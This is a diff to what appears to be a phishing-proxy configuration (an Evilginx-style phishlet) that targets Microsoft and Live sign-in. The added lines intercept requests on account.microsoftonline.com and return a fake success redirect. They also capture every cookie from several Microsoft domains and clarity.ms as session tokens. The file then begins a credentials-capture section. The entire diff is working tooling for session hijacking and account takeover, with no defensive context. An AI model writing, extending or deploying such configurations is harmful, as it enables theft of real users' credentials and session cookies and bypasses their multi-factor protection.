@@ -90,6 +90,11 @@ intercept:
     http_status: 200
     body: '{"redirect_url": "/landingv2", "success": true}'
     mime: 'application/json'
+  - domain: 'account.microsoftonline.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
   - domain: 'office.com'
     path: '^/s/[a-f0-9]{64}'
     http_status: 200
@@ -109,27 +114,32 @@ intercept:
 auth_tokens:
   - domain: '.live.com'
     keys: ['.*:regexp']
-    type: 'cookie'
   - domain: 'live.com'
     keys: ['.*:regexp']
-    type: 'cookie'
   - domain: '.microsoft.com'
     keys: ['.*:regexp']
-    type: 'cookie'
   - domain: 'microsoft.com'
     keys: ['.*:regexp']
-    type: 'cookie'
   - domain: '.microsoftonline.com'
     keys: ['.*:regexp']
-    type: 'cookie'
   - domain: 'microsoftonline.com'
     keys: ['.*:regexp']
-    type: 'cookie'
+  - domain: 'account.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.account.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.clarity.ms'
+    keys: ['.*:regexp']
+  - domain: 'clarity.ms'
+    keys: ['.*:regexp']
   - domain: 'login.live.com'
-    path: '/.*'
-    name: 'token'
-    header: 'authorization'
-    type: 'http'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+    # path: '/.*'
+    # name: 'token'
+    # header: 'authorization'
+
 
 credentials:
   username:
